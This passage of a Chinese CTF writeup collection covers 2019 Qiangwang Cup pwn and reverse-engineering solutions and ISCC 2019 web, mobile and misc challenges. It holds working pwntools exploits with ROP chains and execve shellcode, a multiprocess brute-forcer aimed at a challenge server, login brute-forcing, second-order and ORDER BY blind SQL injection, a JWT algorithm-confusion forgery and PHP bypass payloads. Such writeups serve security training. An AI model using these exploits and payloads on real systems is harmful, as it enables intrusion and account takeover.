p.recvuntil(\"The length of my owner's name:\\n\") p.sendline(str(lenth)) p.recvuntil(\"Give me my owner's name:\\n\") p.send(name) def show(index): p.recvuntil('Choice >> \\n') p.sendline('2') p.recvuntil('Please tell me which tickets would you want to open?\\n') p.sendline(str(index)) p.recvuntil(\"I'm a magic tickets.I will tell you who is my owner!\\n\") def edit(index,length,name): p.recvuntil('Choice >> \\n') p.sendline('3') p.recvuntil(\"Please tell me which tickets would you want to change it's owner's name?\\n\") p.sendline(str(index)) p.recvuntil(\"The length of my owner's name:\\n\") p.sendline(str(length)) p.recvuntil(\"Give me my owner's name:\\n\") p.send(name) # gdb.attach(p) add(0x80,\"a\"*0x7f) add(0x80,'/bin/sh\\x00'.ljust(0x7f,'a')) edit(0,0x80+0x10+1,'a'*0x90) show(0) p.recvuntil('a'*0x90) heap = p.recvuntil('\\n')[:-1] print heap heap = u64(heap.ljust(8,'\\x00')) edit(0,0x80+0x18+1,'a'*0x98) show(0) p.recvuntil('a'*0x98) putsaddr = u64(p.recv(6).ljust(8,'\\x00')) libcaddr = putsaddr - libc.symbols['puts'] print \"**********\" print hex(heap) print hex(libcaddr) payload = 'a'*0x80 + p64(0) + p64(0x21) + p64(heap) + p64(libcaddr + libc.symbols['system']) edit(0,0x80+0x20+1,payload) show(1) p.interactive() xxwarmup 十分恶心的一道题，sub_80483DB存在栈溢出，难点就在ROP怎么做了，思路就是通过部分改libc_start_main（可以通过sub_80483DB去做），然后再一个ret或者jmp过去，难点是远程开启了aslr这个地址随机了，所以要碰撞一下，概率应该为1/(2^24)（可以先本地关了aslr去做，就不用爆破了）。然后尝试过程如下： 尝试改写为one_gadget，结果8个没有一个成功（虽然后面发现不能拿shell） 尝试改system传/bin/sh，发现在system内有一个抬高栈的操作sub esp, 0x15c，这样esp就指向了不可写的区域，而我们最高能控制到0x40+0x80的地方。就是说sub后一定会到不可以写区域，凉凉 尝试syscall去做，结果edx没gadget，全是call edx，卒 回过头来去改payload，用sub_80483DB把栈复制到0x500高处，然后再把esp改过去，再执行system，然后本地可以/bin/sh了。 然后开启多进程去碰撞远程发现不行，回去看pow.py，发现只能在最开始接收一次输入，然后在输出一次就没了，而且大小都是0x100限制了。 在尝试‘cat \\x00’，可以通过报错发现目录，很长，，，，。因为一开始payload构造的太长了，只剩下8字节放命令，而cat /也不能输出（猜测因为这样先匹配了bin/） 回去重构整个payload，把可以放命令的空间提高到了40字节，然后使用命令'cat _the_flag_dir_name_you_shold_guess/*\\x00'，在多进程下碰撞了半天后，成功得到了flag。 #-*- coding: utf-8 -*- from pwn import * from hashlib import * from multiprocessing import Process # bp 0x8048519 context.log_level = \"error\" def gen(one): _copy = 0x080483db _esp = 0x0804a040 _libc_start = 0x0804a00c ppp_ret = 0x08048619 pop_ebp = 0x08048518 rop = '' rop += p32(_copy) + p32(ppp_ret) + p32(_libc_start) + p32(_esp+(13*4)) + p32(3) rop += p32(_copy) + p32(ppp_ret) + p32(_esp+0x500-0x44) + p32(_esp+0x44) + p32(0x40) rop += p32(pop_ebp) + p32(_esp+0x500-0x44) rop += p32(0x08048512) rop += p32(one) rop += 'A' * (0x40 - len(rop) ) rop += p32(0x0804a044) rop += p32(_esp+0x500-0x40) rop += p32(0x080482c0) * 2 rop += p32(0) rop += p32(_esp+0x510-0x40) rop += 'cat _the_flag_dir_name_you_shold_guess/*\\x00' # print len(rop.encode('hex')) # print rop.encode('hex') return rop.encode('hex') # gen(0xf7e29200) def pow(io): chal = io.recvuntil('\\n',drop=True) return iters.mbruteforce(lambda x: sha256(chal + x).hexdigest().startswith('00000'), string.letters+string.digits, 4, 'fixed') def random_aslr(n): r = ''.join(random.choice('abcdef'+string.digits) for _ in xrange(3)) ri = int(hex(n)[2:4]+r+hex(n)[-3:], 16) return int(hex(n)[2:4]+r+hex(n)[-3:], 16) def fuck(): while True: io = remote('49.4.30.253', 31337) # io = remote('127.0.0.1', 5002) io.send(pow(io)) # io.sendline(gen(random_aslr(0xf7dec000+0x3cd10))) # io.sendline(gen(0xf7e29200)) io.sendline(gen(0xf7dec000+0x3cd10)) buf = io.recvall() print buf if '{' in buf or 'flag' in buf: print buf raw_input() io.close() if __name__ == '__main__': p_list = [] for ip in range(10): p = Process(target=fuck) p.start() p_list.append(p) time.sleep(1) for res in p_list: res.join() babymimic ret2syscall的拟态版本，通过add sp，把32和64区分开，然后分别rop一下，具体看exp。其中遇到几个问题： 最开始32和64位都是用syscall做的，32位可以成功，64位syscall执行不了不知道为什么。最后把64位换成用mprotect去增加可执行权限后ret2shellcode 要让32和64位程序执行后你要recv的东西一致才行，因为程序ret前puts了一下，这里要填点东西，然后\\x00截断一下 flag拿到后还有个异或操作，就很简单了 #-*- coding: utf-8 -*- from pwn import * from hashlib import sha256 __author__ = '3summer' s = lambda data :io.send(str(data)) sa = lambda delim,data :io.sendafter(str(delim), str(data)) sl = lambda data :io.sendline(str(data)) sla = lambda delim,data :io.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) irt = lambda :io.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) context.terminal = ['tmux', 'sp', '-h', '-l', '110'] context.log_level = 'debug' token = 'bfdccbebf86687951f6d37b3e5a35fe1' def dbg(breakpoint): gdbscript = '' elf_base = 0 gdbscript += 'b *{:#x}\\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint gdbscript += 'c\\n' log.info(gdbscript) gdb.attach(io, gdbscript) time.sleep(1) def pow(): ru('.hexdigest()=') sha_256 = ru('\\n') ru(\".encode('hex')=\") half = ru('\\n').decode('hex') dic = [chr(i) for i in range(0x100)] ans = iters.mbruteforce(lambda x: sha256(half + x).hexdigest()==sha_256, dic, 3, 'fixed') sla(\"skr.encode('hex')=\", (half+ans).encode('hex')) sla(':', token) def exploit(io): print ru('it?\\n') # 64位 # dbg(0x400B33) int_0x80_x64 = 0x000000000044e82c pop_rax = 0x000000000043b97c pop_rdx = 0x000000000043b9d5 pop_rdi = 0x00000000004005f6 pop_rsi = 0x0000000000405895 read_plt = 0x43B9C0 add_rsp = 0x00000000004079d4 # add rsp, 0xd8 ; ret # 32位 # dbg(0x804892F) int_0x80_x86 = 0x080495a3 add_esp = 0x0804f095 # add esp, 0x1c ; ret read_plt_32 = 0x0806C8E0 pop_3_ret = 0x08055f54 # pop eax ; pop edx ; pop ebx ; ret pop_ecx = 0x0806e9f2 # pop ecx ; pop ebx ; ret rop_32 = p32(read_plt_32) + p32(pop_3_ret) + p32(0) + p32(0x80d7000) + p32(0x100) + p32(pop_ecx) + p32(0) + p32(0) + p32(pop_3_ret) + p32(0xb) + p32(0) + p32(0x80d7000) + p32(int_0x80_x86) # rop_64 = p64(read_plt) + p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(0x6a13e3) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(int_0x80_x64) rop_64 = p64(read_plt) + p64(pop_rdi) + p64(0x69e000) + p64(pop_rsi) + p64(0x6000) + p64(pop_rdx) + p64(7) + p64(0x43C7A0) + p64(0x6a13e3+8) payload = 'test'+'\\x00'*0x108 + 'b'*4 + p32(add_esp) + 'c'*4 + p64(add_rsp) + 'd'*0x10 + rop_32.ljust(0xc8,'e') + rop_64 # 32_ret 64_ret 32_rop(0xc8) 64_rop s(payload) sa('test\\n','/bin/sh\\x00'+'jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05') return io if __name__ == '__main__': if len(sys.argv) > 2: io = remote(sys.argv[1], sys.argv[2]) pow() else: io = process(sys.argv[1], 0) exploit(io) irt() random 可以分为两种chunk，暂且把calloc的成为func_chunk，malloc的成为data_chunk。 首先在输入name的时候可以带个地址出来，算到pie的基址。然后days和times姑且就输入最大的35和10。然后来看他的func_chunk的4个功能，分别是增，改，删，查，4个函数指针存放func_chunk上，在sub_10DB时调用，他的调用是这样的 free(ptr); v5(ptr); 很明显存在一点问题，但是又感觉太抽象了。同时注意到add后会问你是否需要再add一个func_chunk。 因为堆上存在函数指针，所以思路应该是和UAF例题类似的看能不能覆盖这个指针，那么如果控制data_chunk和func_chunk大小一样大，应该哪里会造成点错误出来。 开始尝试add，但是我们一轮有10个func_chunk加上随机性，所以add一次然后gdb断下去看下堆。这样重复下去，当我add完第3个的时候发现第3个堆的开始地方居然被写了一个堆指针。仔细研究后发现，bss上的0x203168作为func_chunk的头节点，使用单向链表链接起来。那么可以通过编辑第3个data_chunk，我们能控制： func_chunk的这个单向链表 修改func_chunk的函数指针，通过call rdx可以劫持执行流 后面就是要泄漏libc了，因为限制了chunk大小，全是fast泄漏不了libc，所以构造一个0x91的堆头去free，然后打印出来就能拿到libc，接着就是call rdx执行one_gadget。由于程序逻辑有点绕，调试过程十分虐心。脚本如下： #-*- coding: utf-8 -*- from pwn import * __author__ = '3summer' s = lambda data :io.send(str(data)) sa = lambda delim,data :io.sendafter(str(delim), str(data)) sl = lambda data :io.sendline(str(data)) sla = lambda delim,data :io.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) irt = lambda :io.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) binary_file = './random' context.binary = binary_file context.terminal = ['tmux', 'sp', '-h', '-l', '110'] context.log_level = 'debug' elf = ELF(binary_file) libc = elf.libc one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147] libc.symbols['one_gadget'] = one_gadgets[0] cnt = 10 def dbg(breakpoint): glibc_dir = '/usr/src/glibc/glibc-2.23/' gdbscript = 'directory %smalloc\\n' % glibc_dir gdbscript += 'directory %sstdio-common/\\n' % glibc_dir gdbscript += 'directory %sstdlib/\\n' % glibc_dir gdbscript += 'directory %slibio\\n' % glibc_dir elf_base = int(os.popen('pmap {}| awk \\x27{{print \\x241}}\\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0 gdbscript += 'b *{:#x}\\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint gdbscript += 'c\\nvis_heap_chunks 0x555555758000 20\\ndqs 0x555555554000+0x203168\\ndq 0x555555554000+0x203180 30' log.info(gdbscript) gdb.attach(io, gdbscript) time.sleep(1) def choice(cmd, *argv): global cnt while True: v = ru('\\n') if '(Y/N)' in v: if cmd in v: sl('Y') break else: sl('N') elif '(0~10)' in v: sl(cnt) else: pass for i in argv: if isinstance(i,tuple): sla(i[0],i[1]) continue sla(':',i) add = lambda size,content,bol :choice('add',size,content,('(Y/N)',bol)) edit = lambda idx,content :choice('update',idx,content) show = lambda idx :choice('view',idx) delete = lambda idx :choice('delete',idx) def exploit(io): global cnt # dbg(0x176B) # strdup # dbg(0x0177F) # srand # dbg(0x11BA) # call func_ptr # dbg(0x1425) # add_done # dbg(0x159B) # free # dbg(0x0150B) # edit_done # dbg(0x13F2) # add_2 # dbg(0x134D) # malloc # dbg(0x14E2) # edit_read # dbg(0x11AC) # free_call # dbg(0x13B3) # add_read sa('name:', 'a'*0x8) ru('a'*8) elf.address = uu64(r(6))-0xb90 success('elf = 0x%x' % elf.address) sla('?\\n', 35) add(0x3f,'0'*0x10,'Y') add(0x3f,'1'*0x10,'Y') add(0x17,'2'*0x10,'Y') show(2) ru('\\n') heap_base = uu64(ru('\\n'))-0xb0 success('heap = 0x%x' % heap_base) edit(2, flat(heap_base+0x1b0, elf.address+0x1427, p8(2))) edit(0, flat(heap_base+0x1b0, elf.address+0x1600, 2, 0x91, heap_base+0x190, elf.address+0x129E, 2)) add(0x3f, flat(heap_base+0x250, elf.address+0x1427, 2), 'N') show(2) ru('\\n') unsorted_bin = uu64(r(6)) libc.address = unsorted_bin-libc.sym['__malloc_hook']-88-0x10 success('libc = 0x%x' % libc.address) edit(1, flat('1'*0x8, 0x41, '/bin/sh\\x00', libc.sym.one_gadget, 2)) return io if __name__ == '__main__': if len(sys.argv) > 1: io = remote(sys.argv[1], sys.argv[2]) else: io = process(binary_file, 0) # io = process(binary_file, env={\"LD_PRELOAD\":\"./libc-2.23.so\"}) exploit(io) irt() babyjs 详情见：https://xz.aliyun.com/t/5279 RE JustRe 第一部分： 两端执行相同操作，看其中一个即可。 from z3 import * base_data = [0x78B09135,0xE78DBAE5,0xFB0C084A, 0x3B5C0EA2,0x82C7F904,0xF937EE81,0xEB130A06,0x3B4D7202,0x3ACC6A08,0x045A0A49, 0x26E84E1B,0x5513B95C, 0x3B4D8209,0xAD132C0D, 0x044BEE4A,0x61164B1F] base_data = [0x79B19266, 0x0E88EBBB6, 0x0FC0D093B, 0x3C5D0F73, 0x83C8FA15, 0x0FA38EF92, 0x0EC140B17, 0x3C4E7313, 0x3BCD6B19, 0x55B0B5A,0x27E94F0C,0x5614BA4D,0x3C4E831A,0x0AE142D1E, 0x54CEF5B, 0x62174C10] func_data = [0x83EC8B55,0xEC81F0E4,0x00000278,0x405004A1,0x89C43300,0x02742484,0x100F0000,0x4041A805,0x41C0A000,0x0F560040,0x2C244411,0x7E0FF357,0x4041B805,0xD60F6600,0x0F402444,0x6A0A4110] f1 = BitVec('f1', 4*8) f2 = BitVec('f2', 4*8) # f1 = Int(\"f1\") # f2 = Int(\"f2\") solver = Solver() for i in range(16): solver.add(func_data[i] == ((f1 + i) ^ ((0x1010101 * f2) + base_data[i]))) s = solver.check() m = solver.model() print hex(int(str(m[f1])))[2:], hex(int(str(m[f2])))[2:] # 13242218 18 第二部分 密钥为 \"AFSAFCEDYCXCXACNDFKDCQXC\" 的3des算法。直接算即可 from Crypto.Cipher import DES3 import base64 BS = DES3.block_size def pad(s): return s + (BS - len(s) % BS) * chr(BS - len(s) % BS) def unpad(s): return s[0:-ord(s[-1])] class prpcrypt(): def __init__(self, key): self.key = key self.mode = DES3.MODE_ECB def encrypt(self, text): text = pad(text) cryptor = DES3.new(self.key, self.mode) x = len(text) % 8 if x != 0: text = text + '\\0' * (8 - x) # print(text) self.ciphertext = cryptor.encrypt(text) return (self.ciphertext).encode(\"hex\") def decrypt(self, text): cryptor = DES3.new(self.key, self.mode) # de_text = base64.standard_b64decode(text) plain_text = cryptor.decrypt(text) st = str(plain_text.decode(\"utf-8\")).rstrip('\\0') print st.encode(\"hex\") print st out = unpad(st) return out # 507CA9E68709CEFA20D50DCF90BB976C #9090F6B07BA6A4E8 cipher = \"507CA9E68709CEFA20D50DCF90BB976C\".decode(\"hex\") p = prpcrypt(\"AFSAFCEDYCXCXACNDFKDCQXC\") print p.decrypt(cipher) 强网先锋_AD Ida打开看到程序逻辑只有一个加密函数， 跟进后发现只是简单的base64加密， 将密文提出来后解密一下就行 Flag: flag{mafakuailaiqiandaob} 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-20 21:54:39 0 issues reported "},"articals/2019iscc.html":{"url":"articals/2019iscc.html","title":"2019ISCC","keywords":"","body":"2019ISCC 题目类型： 类型 年份 难度 官方赛事题 2019 易 题目下载: 链接：https://pan.baidu.com/s/1JU2GTO-0yi6scU-M3bcavA 提取码：axba 网上公开WP： https://www.zhaoj.in/read-5629.html https://www.anquanke.com/post/id/179216 本站备份WP 感谢作者：Glzjin、Henu_摇光 Web web1 靶机：http://39.100.83.188:8001 知识点：代码审计，PHP函数缺陷（特性？） 步骤： 1.打开靶机，又是直接看到源码了。 32 && $value[$i] 2333) { echo 'Hello '.$username.'!', '', PHP_EOL; echo $flag, ''; } } highlight_file(__FILE__); 2.审代码。 首先看到从请求中获取了 value 和 password，其中 value 是个数组，先判断是否大于 33 小于 127，符合会被 unset 不处理，不符合的才基于 ASCII 码表将其中的元素逐个从数字转为字符，拼接成用户名。 然后判断用户名是否为 w3lc0me_To_ISCC2019，再判断用 intval 之后的 password 是否小于 2333， intval 之后的 password + 1 是否大于 2333。 3.看到这里， 首先是如何绕过那个 大于 33 小于 127 的判断，还要能让 username 能被正确拼接出来。 这里我们查一下 chr 函数的文档 https://www.php.net/manual/en/function.chr.php，里面有这样提到 会对传入值取 256 模。那么我们传入一个大一些的数字就可以绕过了。 写个小脚本来生成 payload: input_str = input() result = '' for i in input_str: result += '&value[]=' + str(ord(i) + 256) print(result) 对于 password 的判断，想起了 intval 的缺陷，只处理能处理的字符，比如对于 intval(‘0x01’)，执行之后返回 0，但要是 intval(‘0x01’ + 1) 呢？PHP 会先将 ‘0x01’ 视作十六进制数与 1 相加，再丢给 intval 处理，那么结果就是 2，可以用下面的代码进行测试。 OK，那对照 ASCII 码表，以及上面我们的结论，得出以下 payload: /?password=0xaaaa&value[]=375&value[]=307&value[]=364&value[]=355&value[]=304&value[]=365&value[]=357&value[]=351&value[]=340&value[]=367&value[]=351&value[]=329&value[]=339&value[]=323&value[]=323&value[]=306&value[]=304&value[]=305&value[]=313 0xaaaa = 43690 > 2333 请求一下~ Flag 到手~ web2 靶机：http://39.100.83.188:8002/ 知识点：暴力破解，验证码绕过 步骤： 1.打开靶机，发现是个登录页面。 2.测试登录，抓个包试试。 3.OK，既然提示了三位数字，那么就来暴力破解吧。 还观察到一个有意思的现象，要是不访问 /vcode.php，不产生 session，不带上 cookie 访问的话，那么验证码就形同虚设了，可以绕过了。 所以 Python 脚本如下： import requests # session = requests.Session() for i in range(1, 999): password = str(i) if len(password) == 1: password = '00' + password elif len(password) == 2: password = '0' + password r = requests.post(\"http://39.100.83.188:8002/login.php\", data = {'username': 'admin', 'pwd': password, 'Login': 'submit'}) r.encoding = 'unicode' print(password + ' ' + r.text) if r.text != '密码错误': break 4.跑一下~ 5.Flag 到手~ web3 靶机：http://39.100.83.188:8065/ 知识点：二次注入 原题以及注意：此题解法不确定，虽然是 SQLi-Labs 的原题https://bbs.pediy.com/thread-251338.htm，但是大家都在试- -也不知道谁的方法对谁的方法错了。 步骤： 1.打开靶机。发现是这样一个页面。 页面标题为 Second Degree Injections，提示其为二次注入。 3.那么就来注册个带二次注入的账号试试。 4.再登录看看。 5.重新改个密码，原密码我输入了 123456。 点提交，猜测程序是直接调用用户名，传到 sql 请求的时候没做过滤，所以这里执行的 sql 语句就大概是update users set password='123456' where username='admin'—-***** ，可以直接改 admin 的密码了。看页面这个样子似乎是改成功了？ 7.用 admin 和 123456 试试，登录成功。 PS: 这里可以写个脚本 用 admin 和 123456 不断登录试试，总有师傅会把密码改成 123456，这样捡别人的也可以了。 Flag 到手~ web4 靶机：http://39.100.83.188:8066 知识点：代码审计，函数使用不恰当，变量覆盖 原题：https://www.securepatterns.com/2019/04/ 步骤： 1.打开靶机，发现直接显示了源码。 \"); } echo $flag; } }else{ show_source(__FILE__); }?> 2.审一下，发现了当传入的参数中 action 为 auth，并且 key 和 hashed_key 相等时，就给出 flag。 3.但注意，这里有用到一个非常危险的函数 parse_str，参看 https://www.php.net/manual/zh/function.parse-str.php ，如果传入的是query_string（形如 a=1&b=2 ），那么就会将其解析为变量（设置变量 a=1, b=2） 4.好说了，那么我们就可以玩变量覆盖了，将 hashed_key 覆盖为我们想要的值即可，那么这里我选择覆盖 sha256(“glzjin”) = b262138fc423f9f944a3161a28e3e7e3a1e779c39c5240f0399f923053e6e371，payload 如下： /?action=auth&key=glzjin&hashed_key=b262138fc423f9f944a3161a28e3e7e3a1e779c39c5240f0399f923053e6e371 Flag 到手~ web5 靶机：http://39.100.83.188:8054/ 知识点：User-Agent 伪造，参数猜解，Order By 注入 步骤： 1.打开靶机，提示这种东西。 2.那看看伪造 User-Agent 能不能成。 Http 头设置 User-Agent 为 aaaUnion.373，成了！ 3.然后提示要用户名，来猜测下参数试试。 更改请求为 POST，添加一个参数 username，再发出请求。 OK，不再提示请输入用户名，username 这个参数猜出来了。 4.如法炮制，猜出 password 这个参数。 5.提示组织成员密码即为 flag。那么我们就来看看有没有注入能读出 flag 吧。 6.测试注入点。第二列为用户名列。猜测第三列为密码列。 发现其屏蔽了很多东西，where，and，括号，等号，下划线都给屏蔽了。 7.尝试构造请求绕过验证，获取用户名 union_373_Tom。 相当于 select * from table_name where username=\"*/*' and password='*/\" 等效于 select * from table_name where username=\"*\" =\"*\"就任意匹配了，自己找个表做个实验可以验证。 相当于 select * from table_name 8.拿到用户名之后，来看看能不能搞到密码。 多方测试后，payload 如下 username=union_373_Tom' union all select 1,2,'1' /* &password=*/ order by 3,2,'1 解释一下，这里会查询到两条记录，一条是 union_373_Tom 的（下文用原条目表示），还有一条是我们 union 进去的 2 的（下文用新条目表示）。 后面的 order by 排序是关键，首先对第三列也就是我们猜测的密码列进行排序，默认是升序的，字典序小的在前面。程序返回的都是排第一个的条目。 所以有三种情况， 要是新条目第三列密码列（上文 payload 里为 ‘1’）字典序小于原条目第三列密码列，返回的就是新条目。 要是相等就继续跳到第二列比较，第二列数据都是已知的，必然是新条目在前面。 要是大于就返回原条目了。 构造了一个布尔条件，实现了我们可控的新条目的密码列与原条目密码列的字典序比较(小于等于)。 9.OK，那就说明我们可以构造请求，把原条目的密码给逐位跑出来了。 Python 脚本如下： import binascii import requests url = \"http://39.100.83.188:8054/\" def half(payload): low = 0 high = 126 while low 有两种跑法，二分和顺序，二分的话得运行两次，因为 order by 遇到下划线之类的符号似乎不得劲儿，顺序法的话还好，不受干扰。 关于这里 if ord(temp_return_str) == 33: break 这个 33，为 ASCII 的第一个可视字符（前面为空格）。 Mysql 似乎会忽略 ASCII 码小于 32 的不可视字符。而到了 33 一直跑下去，就永远是新条目字典序大，返回的就一直是原条目了。 10.运行脚本。 11.得到 Flag~ web6 靶机：http://39.100.83.188:8053/ 原题：https://www.anquanke.com/post/id/145540 知识点：代码泄露，JWT 原理 步骤： 1.打开靶机，发现是这样一个页面。 2.那么就先注册了。 3.登录看看。 4.提交，抓包看看。 Authorization 这个头特别有意思，BASE64 解码看看。 6.看起来是 JWT，那么就到 https://jwt.io/ 解码看看。 7.OK，那么再来看看网页源码。 看到 /static/js/common.js， 最后有一段 function getpubkey(){ /* get the pubkey for test /pubkey/{md5(username+password)} */ }` 咦，这是可以泄露 pubkey 了- -？ 8.那么就构造个访问看看，我的用户名 glzjin，密码 123456，那么 md5(“glzjin123456”) 就是 578a0a535bce1db2a2de0cd58b776ebf 访问 /pubkey/578a0a535bce1db2a2de0cd58b776ebf 获得了 pubkey。 OK，那么我们来尝试更改一下 alg 所指代的算法，将其从 RS256 这种非对称加密改成 HS256 这种对称加密，这样我们有公钥就可以伪造 JWT Token 从而为所欲为了。 10.首先把 pubkey 存到一个文本文件里。空格换行自己处理好。 11.然后用 Python 脚本来伪造令牌，payload 部分填写自己想要的内容。 import jwt public = open('1.txt', 'r').read() print(jwt.encode({\"name\": \"glzjin\",\"priv\": \"admin\"}, key=public, algorithm='HS256')) 12.运行，报错了。 Never mind，我们直接去库源码里把这一段删了。 再运行，就可以得到新的 JWT Token 了。 13.然后将这个 JWT Token 放到 LocalStorage 里，覆盖原先的 Token。 14.list 一下，看到开头那里是 admin 留的东西。 15.访问看看。/text/admin:22f1e0aa7a31422ad63480aa27711277 Flag 到手~ Mobile Mobile01 附件： 下载 知识点：Android逆向，NDK 静态分析 步骤： 1.安装一下，看看这是啥玩意儿。 输入注册码的话，会提示错误。 2.那么来解包看看。 3.然后用 dex2jar 把 dex 给解解。 d2j-dex2jar.sh classes.dex 4.然后用 jd-gui 打开看看。看到 com.iscc.crackme 的 MainActivity 5.审下代码，看到那个按钮按下之后会调用 checkFirst 和 checkSecond 两个方法，checkFirst 里先判断长度是否为 16 位，然后依次判断各位上是否为大于 0 小于 9 的数字（1~8），符合要求就返回 True。而对于 checkSecond，我们需要到 NDK 里看看了。 6.这里我们选择 lib/x86 下的 so 来分析。拖进 ida。 7.直接看到NDK调用的入口函数 Java_com_iscc_crackme_MainActivity_checkSecond，F5 看看。 可以看到主要是 checkfirst 和 checkAgain 两个函数在起作用，并且传入他们的参数似乎就是从 Java 程序里传过来的参数–那个注册码。 8.先看 checkfirst。 上面两个判断（别问我- -这里我没看明白），决定是处理前八位还是后八位，然后在这八位里逐位看后面的是否大于前面的，那么前八位和后八位中就必然有一段是 12345678 了。 9.再来看看 checkAgain。 一样的套路，和之前一样的判断。v13 那里似乎是把前八位取出来了，并且将其转换为对应的整型数字 – 1（减去的是 ASCII 码 49，也就是字符 1）了，而 v9那里则是把后八位给取出来了，v10,v11,v12按照地址进行计算，则分别是第十位，第十五位，第十六位。 再来看下面的判断，首先是第十六位和第九位相加要等于 5+2（前面转换的时候每一位都减 1 了） 也就是 7，第十位与第十五位相加要等于 12 + 2（同上） 也就是14。 而两个循环嵌套的情况下，就是前八位先对自身比较，确保没有重复的数字，后八位也是如此。再就是要求拆开之后看，前八位和后八位，相同位置上的数之间的差的绝对值不能相等。举个例子，我们有 12345678 31524678，这里前八位 3 – 1 = 2，而后八位 5 – 3 =2 ，这样就不符合条件了。 有这些理论条件做基础，我们就可以编写程序来调用这个 so 库进行爆破了。 11.打开 AndroidStudio，新建一个 APP。包名要和被爆破的源 APP 一致，为 com.iscc.crackme。 12.把之前解包出来的文件夹里的 libs 文件夹拷到我们创建的这个项目里。 13.修改 app 目录里的 build.gradle，添加如下的代码，使其打包时带上 NDK。 task nativeLibsToJar(type: Zip, description: \"create a jar archive of the native libs\") { destinationDir file(\"$projectDir/libs\") baseName \"Native_Libs2\" extension \"jar\" from fileTree(dir: \"libs\", include: \"**/*.so\") into \"lib\" } tasks.withType(JavaCompile) { compileTask -> compileTask.dependsOn(nativeLibsToJar) } 13.再修改 MainActivity，添加爆破相关逻辑。 package com.iscc.crackme; import android.os.Bundle; import android.support.design.widget.FloatingActionButton; import android.support.design.widget.Snackbar; import android.support.v7.app.AppCompatActivity; import android.support.v7.widget.Toolbar; import android.view.View; import android.view.Menu; import android.view.MenuItem; import android.widget.TextView; public class MainActivity extends AppCompatActivity { static { System.loadLibrary(\"native-lib\"); } private TextView tv; @Override protected void onCreate(Bundle savedInstanceState) { tv = this.findViewById(R.id.test); super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Toolbar toolbar = findViewById(R.id.toolbar); setSupportActionBar(toolbar); FloatingActionButton fab = findViewById(R.id.fab); fab.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View view) { System.out.println(\"Start~\"); for(int i1 = 1; i1 &lt;= 8; i1++) { for(int i2 = 1; i2 &lt;= 8; i2++) { if(i1 == i2) { continue; } for(int i3 = 1; i3 &lt;= 8; i3++) { if(i1== i3 || i2 == i3) { continue; } for(int i4 = 1; i4 &lt;= 8; i4++) { if(i1 == i4 || i2 == i4 || i3 == i4) { continue; } for(int i5 = 1; i5 &lt;= 8; i5++) { if(i1 == i5 || i2 == i5 || i3 == i5 || i4 == i5) { continue; } for(int i6 = 1; i6 &lt;= 8; i6++) { if(i1 == i6 || i2 == i6 || i3 == i6 || i4 == i6 || i5 == i6) { continue; } for(int i7 = 1; i7 &lt;= 8; i7++) { if(i1 == i7 || i2 == i7 || i3 == i7 || i4 == i7 || i5 == i7 || i6 == i7) { continue; } for(int i8 = 1; i8 &lt;= 8; i8++) { if(i1 == i8 || i2 == i8 || i3 == i8 || i4 == i8 || i5 == i8 || i6 == i8 || i7 == i8) { continue; } for(int i9 = 1; i9 &lt;= 8; i9++) { for(int i10 = 1; i10 &lt;= 8; i10++) { if(i9 == i10) { continue; } for(int i11 = 1; i11 &lt;= 8; i11++) { if(i9 == i11 || i10 == i11) { continue; } for(int i12 = 1; i12 &lt;= 8; i12++) { if(i9 == i12 || i10 == i12 || i11 == i12) { continue; } for(int i13 = 1; i13 &lt;= 8; i13++) { if(i9 == i13 || i10 == i13 || i11 == i13 || i12 == i13) { continue; } for(int i14 = 1; i14 &lt;= 8; i14++) { if(i9 == i14 || i10 == i14 || i11 == i14 || i12 == i14 || i13 == i14) { continue; } for(int i15 = 1; i15 &lt;= 8; i15++) { if(i9 == i15 || i10 == i15 || i11 == i15 || i12 == i15 || i13 == i15 || i14 == i15) { continue; } for(int i16 = 1; i16 &lt;= 8; i16++) { if(i9 == i16 || i10 == i16 || i11 == i16 || i12 == i16 || i13 == i16 || i14 == i16 || i15 == i16) { continue; } String testStr = \"\"; testStr += i1; testStr += i2; testStr += i3; testStr += i4; testStr += i5; testStr += i6; testStr += i7; testStr += i8; testStr += i9; testStr += i10; testStr += i11; testStr += i12; testStr += i13; testStr += i14; testStr += i15; testStr += i16; if(MainActivity.this.checkSecond(testStr)) { System.out.println(\"Found!\" + testStr); break; } } } } } } } } } } } } } } } } } System.out.println(\"End~\"); } }); } public native boolean checkSecond(String paramString); @Override public boolean onCreateOptionsMenu(Menu menu) { // Inflate the menu; this adds items to the action bar if it is present. getMenuInflater().inflate(R.menu.menu_main, menu); return true; } @Override public boolean onOptionsItemSelected(MenuItem item) { // Handle action bar item clicks here. The action bar will // automatically handle clicks on the Home/Up button, so long // as you specify a parent activity in AndroidManifest.xml. int id = item.getItemId(); //noinspection SimplifiableIfStatement if (id == R.id.action_settings) { return true; } return super.onOptionsItemSelected(item); } } 写得丑了点，但速度还是挺快的。程序的主要目的就是生成符合上面分析出来的要求的注册码，然后传给 NDK 判断，找到返回为 True 的注册码。 项目打包： 下载 14.运行，点一下，开跑。 15.得到符合条件的 1234567836275184，填回去试试。 16.Flag 到手~将这个作为 Flag 提交即可~ MISC 隐藏的信息 附件： 下载 知识点：观察？ 步骤： 1.解包之后打开看看这个文件。似乎都是八进制，那转 ASCII 字符试试。 2.不磨叽，上脚本。 import base64 f = open(\"message.txt\", \"r\") s = f.readline().split(' ') result = '' for i in s: if i != '': result 